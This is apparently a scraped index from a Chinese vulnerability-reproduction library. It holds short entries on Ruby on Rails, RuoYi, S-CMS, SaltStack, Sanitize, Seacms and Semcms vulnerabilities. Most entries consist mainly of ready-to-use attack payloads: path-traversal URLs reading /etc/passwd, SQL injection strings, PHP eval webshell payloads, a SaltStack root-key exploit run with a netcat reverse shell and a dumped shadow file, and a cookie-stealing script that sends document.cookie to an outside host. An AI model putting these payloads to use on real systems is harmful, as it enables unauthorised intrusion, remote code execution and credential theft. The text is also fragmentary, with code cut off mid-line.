https://fansonfan.github.io/2019/04/20/rsync-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:36 "},"Web安全/Ruby On Rails/（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞/（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞.html":{"url":"Web安全/Ruby On Rails/（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞/（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞.html","title":"（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞","keywords":"","body":"（CVE-2018-3760）Ruby On Rails 任意文件读取漏洞 一、漏洞简介 Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名的Ruby Web开发框架，Sprockets是编译及存储静态资源文件的Ruby库。 在3.7.1及之前的版本中，存在一处因为二次解码导致的路径穿越中断，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。 二、漏洞影响 4.0.0.beta7及更低版本3.7.1及更低版本2.12.4及更低版本 三、复现过程 漏洞分析 漏洞原理问题出在sprockets，它用来检查 JavaScript 文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。当访问如http://www.0-sec.org:3000/assets/foo.js时，会进入server.rb 漏洞浮现 直接访问http://www.0-sec.org:3000/assets/file:%2f%2f/etc/passwd，将会报错，因为文件/etc/passwd不在允许的目录中： RubyOnRails任意文件读取漏洞/media/rId26.png) 我们通过报错页面，可获得允许的目录列表。随便选择其中一个目录，如/usr/src/blog/app/assets/images，然后使用%252e%252e/向上一层替换，最后读取/etc/passwd： http://www.0-sec.org:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd RubyOnRails任意文件读取漏洞/media/rId27.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:37 "},"Web安全/Ruby On Rails/（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞/（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞.html":{"url":"Web安全/Ruby On Rails/（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞/（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞.html","title":"（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞","keywords":"","body":"（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞 一、漏洞简介 在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞，读取任意文件。 二、漏洞影响 Ruby on Rails \\ 三、复现过程 漏洞分析 在控制器中通过render file形式来渲染应用之外的视图，因此在 actionview-5.2.1/lib/action_view/renderer/template_renderer.rb:22 中会根据 options.key?(:file)，调用find_file来寻找视图。 module ActionView class TemplateRenderer find_file代码如下： def find_file(name, prefixes = [], partial = false, keys = [], options = {}) @view_paths.find_file(*args_for_lookup(name, prefixes, partial, keys, options)) end 继续跟入args_for_lookup函数，用于生成用于查找文件的参数，当其最终返回时会把payload保存在details[formats]中：RubyonRails路径穿越与任意文件读取漏洞/media/rId25.jpg) 此后回到@view_paths.find_file并跟入会进入 actionview-5.2.1/lib/action_view/path_set.rb： class PathSet #:nodoc: def find_file(path, prefixes = [], *args) _find_all(path, prefixes, args, true).first || raise(MissingTemplate.new(self, path, prefixes, *args)) end private # 注，这里的 args 即前面args_for_lookup生成的details def _find_all(path, prefixes, args, outside_app) prefixes = [prefixes] if String === prefixes prefixes.each do |prefix| paths.each do |resolver| if outside_app templates = resolver.find_all_anywhere(path, prefix, *args) else templates = resolver.find_all(path, prefix, *args) end return templates unless templates.empty? end end [] end 由于要渲染的视图在应用之外，因此跟入find_all_anywhere def find_all_anywhere(name, prefix, partial = false, details = {}, key = nil, locals = []) cached(key, [name, prefix, partial], details, locals) do find_templates(name, prefix, partial, details, true) end end 跳过cached部分，跟入find_templates，这里正式根据条件来查找要渲染的模板： # An abstract class that implements a Resolver with path semantics. class PathResolver build_query后如下：RubyonRails路径穿越与任意文件读取漏洞/media/rId26.jpg) 利用../与前缀组合造成路径穿越，利用最后的{{完成闭合，经过File.expand_path解析后组成的query如下: /etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},} 最后/etc/passwd被当成模板文件进行渲染，最后造成了任意文件读取。 漏洞复线 访问http://www.0-sec.org:3000/robots可见，正常的robots.txt文件被读取出来。 利用漏洞，发送如下数据包，读取/etc/passwd： GET /robots HTTP/1.1 Host: www.0-sec.org:3000 Accept-Encoding: gzip, deflate Accept: ../../../../../../../../etc/passwd{{ Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close RubyonRails路径穿越与任意文件读取漏洞/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:38 "},"Web安全/RuoYi CMS/RuoYi CMS 任意文件读取/RuoYi CMS 任意文件读取.html":{"url":"Web安全/RuoYi CMS/RuoYi CMS 任意文件读取/RuoYi CMS 任意文件读取.html","title":"RuoYi CMS 任意文件读取","keywords":"","body":"RuoYi CMS 任意文件读取 POC： https://domain/common/download/resource?resource=/profile/../../../../etc/passwd 1.前言 看到T00ls有位老哥求助某CMS的getshell方法，于是下载了该CMS进行审计，由于审计技术很菜，只找到了任意文件读取漏洞。 2.分析过度 1、看山不是山 打开源码，看到“通用下载请求”的实现方法，先研究一下。 流程如下：1、传入两个参数，一个文件名参数，一个delete参数，控制是否删除2、将全局变量中的下载路径和用户传入的文件名进行拼接 其中getProfile()获取资源下载路径，该下载路径在配置文件中声明了，如下： 3、先读取文件，然后再到FileUtils.writeBytes方法，将文件内容放到response流中。 4、然后判断是否删除文件。 POC构造： 任意文件读取：/common/download?fileName=1.txt&delete=false 任意文件删除：/common/download?fileName=1.txt&delete=true 原以为到这里就可以任意文件读取和删除了，但是忽略了一个点，就是isValidFilename函数，该函数的实现如下： public static String FILENAME_PATTERN = \"[a-zA-Z0-9_\\\\-\\\\|\\\\.\\\\u4e00-\\\\u9fa5]+\"; /** * 文件名称验证 * * @param filename 文件名称 * @return true 正常 false 非法 */ public static boolean isValidFilename(String filename) { return filename.matches(FILENAME_PATTERN); } 过滤了/和\\，无法跨目录。 那这个点就没什么用了，只能删除/home/ruoyi/uploadPath/download/目录下的文件。 2、看山还是山* 往下一翻，还有一个点下载的点，如下：从代码可以看出，下载流程如下：1、从GET请求中获取resource参数的值（可控点） 2、传入StringUtils.substringAfter* 方法进行处理后，与localPath拼接 3、带入将FileUtils.writeBytes处理结果作为response的返回值。 其中StringUtils.substringAfter(finalString str, final String separator) 方法，其实是从str中查找separtator，然后取标志位后面的字符。 在resourceDownload中，传入的标志位是：Constants.RESOURCE_PREFIX，一个全局变量，该变量的值是 那么我们在构造URL时候，需要在想要下载的路径前面加上/profile。 所以poc为： /common/download/resource?resource=/profile/test.txt 穿越目录下载文件的POC： /common/download/resource?resource=/profile/../../../../test.txt 利用点比较鸡肋，只能下载本地资源所在盘符下的文件，但是linux系统下就不受这个影响了。 3.总结 虽然利用很鸡肋，但还是学到了很多东西。在Windows环境下，默认的资源路径在D:/ruoyi/uploadPath,所以只能下载D:/下的文件，一般都可以下载到数据库配置文件吧。在Linux环境下，完全不受限制了，可以下载任意目录下的文件（只要权限够），数据库配置在xxx-admin/src/main/resources下application-druid.yml文件中，有时候目录名会变化，可以先下载根目录下的pom.xml查看目录名，如下： 温馨提示：bash_history可以看下，或许有惊喜。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:40 "},"Web安全/S-CMS/S-CMS sql注入漏洞（一）/S-CMS sql注入漏洞（一）.html":{"url":"Web安全/S-CMS/S-CMS sql注入漏洞（一）/S-CMS sql注入漏洞（一）.html","title":"S-CMS sql注入漏洞（一）","keywords":"","body":"S-CMS sql注入漏洞（一） 一、漏洞简介 二、漏洞影响 三、复现过程 /media/rId24.jpg) 根据文章注入 /media/rId25.jpg) 参考链接 http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:42 "},"Web安全/S-CMS/S-CMS sql注入漏洞（二）/S-CMS sql注入漏洞（二）.html":{"url":"Web安全/S-CMS/S-CMS sql注入漏洞（二）/S-CMS sql注入漏洞（二）.html","title":"S-CMS sql注入漏洞（二）","keywords":"","body":"S-CMS sql注入漏洞（二） 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞位置：index.php /media/rId24.jpg) 跟进函数splitx() function splitx($a, $b, $c) { $d = explode($b, $a); return $d[$c]; } 先上payload http://www.0-sec.org/index.PHP/a'%20where%20if(1,sleep(5),1)%23?action=update_dir 拼凑SQL语句 update TABLE_config set C_dir='index.PHP/a' where if(1,sleep(5),1)#' 解释 $_SERVER['PHP_SELF']：获取当前文件的路径 如：127.0.0.1/xxe/xml.php => /xxe/xml.php explode(separator,string,limit)：分割字符串形成数组 separator：规定在哪里分割字符串。 string：要分割的字符串。 limit：规定所返回的数组元素的数目。 如果使用index.php，结果如下： array (size=2) 0 => string '/index.php/' (length=5) 1 => string '/a' where if(1,sleep(5),1)#' (length=27) 被截断，但若使用index.PHP： array (size=1) 0 => string '/index.PHP/a' where if(1,sleep(5),1)#' (length=39) 前提：Windows系统下不区分文件大小写。 参考链接 http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:43 "},"Web安全/S-CMS/S-CMS xxe漏洞/S-CMS xxe漏洞.html":{"url":"Web安全/S-CMS/S-CMS xxe漏洞/S-CMS xxe漏洞.html","title":"S-CMS xxe漏洞","keywords":"","body":"S-CMS xxe漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 全局搜索simplexml，在weixin/index.php发现漏洞 非常标准的XXE，没有任何过滤手段，往下并未发现有输出XML解析结果的地方，此处应用无回显的XXE攻击手段 漏洞复现 首先在自己的服务器（192.168.64.131）上创建一个供靶机外部引用的dtd文件（test.dtd） \" > %all; 发送POC %dtd; %send; ]> 然后在Apache日志中查看到结果： 在这里发现一个问题，查看其它php文件的内容会发生Detected an entity reference loop错误，查询资料发现libxml解析器默认限制外部实体长度为2k，无法突破，只能寻找压缩解决方案（但效果不明显） 压缩：echo file_get_contents(\"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\"); 解压：echo file_get_contents(\"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1\"); 参考链接 http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:44 "},"Web安全/S-CMS/S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞/S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞.html":{"url":"Web安全/S-CMS/S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞/S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞.html","title":"S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞","keywords":"","body":"S-CMS 学校建站系统 v5.0 邮箱短信轰炸逻辑漏洞 一、漏洞简介 应用程序的短信注册和邮箱注册模块，以及短信和邮箱绑定模块，没有添加时间限制发送数量的机制，导致存在逻辑缺陷，没有限定一段时间内可发送的短信数量。 二、漏洞影响 S-CMS 学校建站系统 v5.0 三、复现过程 该漏洞存在的位置有：前台注册，后台短信模块测试，以及前台用户绑定邮箱以及手机号的位置，均存在该逻辑漏洞。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:47 "},"Web安全/SaltStack/（CVE-2020-11651）SaltStack远程命令执行漏洞/（CVE-2020-11651）SaltStack远程命令执行漏洞.html":{"url":"Web安全/SaltStack/（CVE-2020-11651）SaltStack远程命令执行漏洞/（CVE-2020-11651）SaltStack远程命令执行漏洞.html","title":"（CVE-2020-11651）SaltStack远程命令执行漏洞","keywords":"","body":"（CVE-2020-11651）SaltStack远程命令执行漏洞 一、漏洞简介 二、漏洞影响 SaltStack \\ 三、复现过程 Usage 默认操作（不带参数）是获取给定主机的密钥: root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort. [+] Salt version: 3000.1 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA= root@kalimah:~/salt# 在主机上执行任意命令: root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec \"nc 127.0.0.1 4444 -e /bin/sh\" [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort. [+] Salt version: 3000.1 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA= [+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130 [+] Successfully scheduled job: 20200504153851746472 root@kalimah:~/salt# The same, but on all minions: root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all=\"apt-get upgrade -y\" [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort. [+] Salt version: 3000.1 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA= [!] Lester, is this what you want? Hit ^C to abort. [+] Attemping to execute 'apt-get upgrade -y' on all minions connected to 192.168.115.130 [+] Successfully submitted job to all minions. root@kalimah:~/salt# 任意文件读取: root@kalimah:~/salt# python2 exploit.py --master 192.168.115.130 -r /etc/shadow [+] Salt version: 2019.2.0 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (192.168.115.130:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E= [+] Attemping to read /etc/shadow from 192.168.115.130 root:$6$7qfolaa/$3yhszWj/VUJjfPaqr1yO6NLgV/FhHnVT9Pr6spwJ/F0BJw5vFM.3KjtwcnnuGo5uSJJkLrd28jXrmVZUD9nEI/:17812:0:99999:7::: daemon:*:17785:0:99999:7::: bin:*:17785:0:99999:7::: sys:*:17785:0:99999:7::: sync:*:17785:0:99999:7::: games:*:17785:0:99999:7::: man:*:17785:0:99999:7::: [...] 可以使用--upload src和--upload dest上传文件。注意目标必须是相对路径: root@kalimah:~/salt# python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root [+] Salt version: 2019.2.0 [ ] This version of salt is vulnerable! Check results below [+] Checking salt-master (127.0.0.1:4506) status... ONLINE [+] Checking if vulnerable to CVE-2020-11651... [*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E= [-] Destination path must be relative [+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1 [ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root Requirements Python 2 or 3 Salt (pip3 install salt) poc #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import, print_function, unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') # --- check funcs ---- def check_salt_version(): print(\"[+] Salt version: {}\".format(salt.version.__version__)) vi = salt.version.__version_info__ if (vi Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:49 "},"Web安全/Sanitize/（CVE-2020-4054）Sanitize 跨站脚本漏洞/（CVE-2020-4054）Sanitize 跨站脚本漏洞.html":{"url":"Web安全/Sanitize/（CVE-2020-4054）Sanitize 跨站脚本漏洞/（CVE-2020-4054）Sanitize 跨站脚本漏洞.html","title":"（CVE-2020-4054）Sanitize 跨站脚本漏洞","keywords":"","body":"（CVE-2020-4054）Sanitize 跨站脚本漏洞 一、漏洞简介 于2020/06/16，Ruby Sanitize项目官方发布了编号为``CVE-2020-4054的[漏洞公告](https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m),当Sanitize模块的过滤规则被配置成RELAXED时，利用该漏洞可以绕过该模块的安全过滤功能。具体配置信息可以查看lib/sanitize/config/relaxed.rb`文件。 二、漏洞影响 Sanitize 3.0.0及之后版本（5.2.1版本已修复） 三、复现过程 漏洞分析 HTML语法过滤基础思路 这部分将讲述恶意HTML文本的检测思路与过滤手法，有相关经验的大佬可以直接跳过。 Sanitize是一个用于检测HTML恶意语法并过滤的Ruby模块，其基于白名单的工作方式，提取到输入内容中的HTML标签后，分析并删除不在白名单内的标签，随后生成相对安全的HTML内容，用户可自定自己的白名单规则（例如，只允许、标签），不过该模块有一些默认的规则内容，接下来我会分析RELAXED过滤规则场景下的默认可信标签，列表如下： HTML恶意检测的工作大致分为三步： 将HTML解析为DOM树 从DOM树中删除不可行的标签和属性 将新的DOM树序列化为HTML标签 举个例子，当输入内容如下时： ABCalert(1) 首先会被解析为以下DOM树： Sanitize跨站脚本漏洞/media/rId28.png) 其中 script 标签和 onerror 属性不在白名单规则内，随后将被删除。新的DOM树如下： Sanitize跨站脚本漏洞/media/rId29.png) 反序列化后如下： ABC 理想状态下对输入内容进行过滤后其输出内容都是安全的。 style标签的解析与序列化 Sanitize模块的安全标签列表中包含标签，可以从它入手，因为该标签的处理方式与其它不同。首先，HTML解析器不会解码标签中的HTML实体。举个例子： I I 生成如下DOM树： Sanitize跨站脚本漏洞/media/rId31.png) 可以看到，在标签中已被HTML解码，但在标签中没有。编码的大致过程为''<>等特殊字符被替换成&\"<>。然后，对于一些特定标签比如标签，在反序列化生成新的HTML内容时没有进行HTML实体编码，举个例子： Sanitize跨站脚本漏洞/media/rId32.png) 反序列化生成的HTML内容为： I I 可以看到字符在标签内进行了HTML编码为，但在标签中没有。该特性可被恶意利用，比如如下DOM树： Sanitize跨站脚本漏洞/media/rId33.png) 其由Sanitize反序列化生成HTML内容为： 这将产生XSS漏洞。接下来的问题是：如何构造出一个恶意的DOM树？ Foreign content特性 HTML规范中有很多有趣的特性，当存在或者标签时，解析规则会产生变化且上述中标签的两个特性将不再受用，该特性就是：/标签中的内容会进行HTML实体解码。理想状态下在Sanitize场景下就会生成一个恶意的DOM树举个例子： I 对应的DOM树为： Sanitize跨站脚本漏洞/media/rId35.png) 最终输出为如下并产生XSS漏洞： I 漏洞复现 回到主题，如何绕过Sanitize的过滤规则？RELAXED配置场景下，标签允许输入但是/标签都不行，Sanitize使用的是Google Gumbo解析器,它支持HTML5中的新特性。Sanitize对CSS语法也进行了安全过滤，但是我发现！ 使用/**/注释的方法可以进行有效的代码注入，举个例子： /*DOM树如下： Sanitize跨站脚本漏洞/media/rId38.png) 标签由于不在白名单中被删除了。但其内容仍然存在，因此，此时的DOM树如下： Sanitize跨站脚本漏洞/media/rId39.png) 此时已不再需要进行过滤了，因此反序列化生成的HTML代码为： /**/ 好了，XSS已经出来了。 参考链接 https://xz.aliyun.com/t/8226 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:50 "},"Web安全/Seacms/Seacms = 9.92 前台Getshell/Seacms = 9.92 前台Getshell.html":{"url":"Web安全/Seacms/Seacms = 9.92 前台Getshell/Seacms = 9.92 前台Getshell.html","title":"Seacms = 9.92 前台Getshell","keywords":"","body":"Seacms \\ 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问： http://0-sec.org/data/mysqli_error_trace.php?_=phpinfo() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:53 "},"Web安全/Seacms/Seacms V6.28 远程命令执行漏洞/Seacms V6.28 远程命令执行漏洞.html":{"url":"Web安全/Seacms/Seacms V6.28 远程命令执行漏洞/Seacms V6.28 远程命令执行漏洞.html","title":"Seacms V6.28 远程命令执行漏洞","keywords":"","body":"海洋CMS V6.28 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 一句话payload，密码cmd: http://0-sec.org/search.php?searchtype=5&tid=&area=eval($_POST[cmd] Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:53 "},"Web安全/Seacms/Seacms V6.45 远程命令执行漏洞/Seacms V6.45 远程命令执行漏洞.html":{"url":"Web安全/Seacms/Seacms V6.45 远程命令执行漏洞/Seacms V6.45 远程命令执行漏洞.html","title":"Seacms V6.45 远程命令执行漏洞","keywords":"","body":"海洋CMS V6.45 前台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/search.php?searchtype=5 POST searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if} searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo(); 一句话payload，文件test.php 密码pass: path: http://0-sec.org/search.php }{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen(\"test.php\",\"w\"),'' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:54 "},"Web安全/Seacms/Seacms V6.54 命令执行漏洞/Seacms V6.54 命令执行漏洞.html":{"url":"Web安全/Seacms/Seacms V6.54 命令执行漏洞/Seacms V6.54 命令执行漏洞.html","title":"Seacms V6.54 命令执行漏洞","keywords":"","body":"海洋CMS V6.54 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo(); 命令执行payload path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem(\"whoami\"); 权限足够的话，file_put_concents(\"connect.php\",\"\")，然后连接菜刀即可 权限不足的话，利用payload构造url： http://0-sec.org/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9])) 连接放入 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:55 "},"Web安全/Seacms/Seacms V6.55 命令执行漏洞/Seacms V6.55 命令执行漏洞.html":{"url":"Web安全/Seacms/Seacms V6.55 命令执行漏洞/Seacms V6.55 命令执行漏洞.html","title":"Seacms V6.55 命令执行漏洞","keywords":"","body":"海洋CMS V6.55 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:55 "},"Web安全/Seacms/Seacms V6.61 后台csrf/Seacms V6.61 后台csrf.html":{"url":"Web安全/Seacms/Seacms V6.61 后台csrf/Seacms V6.61 后台csrf.html","title":"Seacms V6.61 后台csrf","keywords":"","body":"Seacms V6.61 后台csrf 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org:10089/backend/，用户名和密码为admin | admin history.pushState('', '', '/') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:56 "},"Web安全/Seacms/Seacms V6.61 后台getshell/Seacms V6.61 后台getshell.html":{"url":"Web安全/Seacms/Seacms V6.61 后台getshell/Seacms V6.61 后台getshell.html","title":"Seacms V6.61 后台getshell","keywords":"","body":"Seacms V6.61 后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 首先登录到管理面板，在这种情况下，将admin目录调整为/backend 其次添加电影并将其图片地址设置为{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if} 添加访问后，/details/index.php?1.html&m=admin&a=assert&b=phpinfo(); 这里的1.html是您刚刚添加的视频的ID。 或者，可以访问/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();显示您刚添加的视频图片的任何其他地方。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:56 "},"Web安全/Seacms/Seacms V9.1 版本SQL注入/Seacms V9.1 版本SQL注入.html":{"url":"Web安全/Seacms/Seacms V9.1 版本SQL注入/Seacms V9.1 版本SQL注入.html","title":"Seacms V9.1 版本SQL注入","keywords":"","body":"Seacms V9.1 版本SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 获取管理员表中第一个用户的密码 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 获取管理员表中第一个用户的账号 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:57 "},"Web安全/Seacms/Seacms 储存型xss/Seacms 储存型xss.html":{"url":"Web安全/Seacms/Seacms 储存型xss/Seacms 储存型xss.html","title":"Seacms 储存型xss","keywords":"","body":"Seacms 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 POST /member.php?action=chgpwdsubmit oldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9 src的值为http://127.0.0.1/test.js的短链接 当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:58 "},"Web安全/Seacms/Seacms 后台getshell/Seacms 后台getshell.html":{"url":"Web安全/Seacms/Seacms 后台getshell/Seacms 后台getshell.html","title":"Seacms 后台getshell","keywords":"","body":"seacms getshell 一、漏洞简介 海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架 二、漏洞影响 三、复现过程 后台代码如下 \"; fwrite($open,$str); fclose($open); ShowMsg(\"成功保存设置!\",\"admin_ip.php\"); exit; } ?> 这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用 代码如下 # test.js var img = new Image(); img.src= \"http://127.0.0.1/test.php?x=\" + document.cookie + \"&p=\" + location.pathname; # test.php 这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下 代码已经写进了后 管理员添加成功 \\ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:59 "},"Web安全/Semcms/Semcms v2.7 sql注入漏洞/Semcms v2.7 sql注入漏洞.html":{"url":"Web安全/Semcms/Semcms v2.7 sql注入漏洞/Semcms v2.7 sql注入漏洞.html","title":"Semcms v2.7 sql注入漏洞","keywords":"","body":"Semcms v2.7 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v2.7 三、复现过程 http://0-sec.org/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&lgid=1 and if(length(database()>0),sleep(10),1) -- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:02 "},"Web安全/Semcms/Semcms v2.7 密码找回漏洞/Semcms v2.7 密码找回漏洞.html":{"url":"Web安全/Semcms/Semcms v2.7 密码找回漏洞/Semcms v2.7 密码找回漏洞.html","title":"Semcms v2.7 密码找回漏洞","keywords":"","body":"Semcms v2.7 密码找回漏洞 一、漏洞简介 二、漏洞影响 SemCMS v2.7 三、复现过程 先在本地搭建好环境。 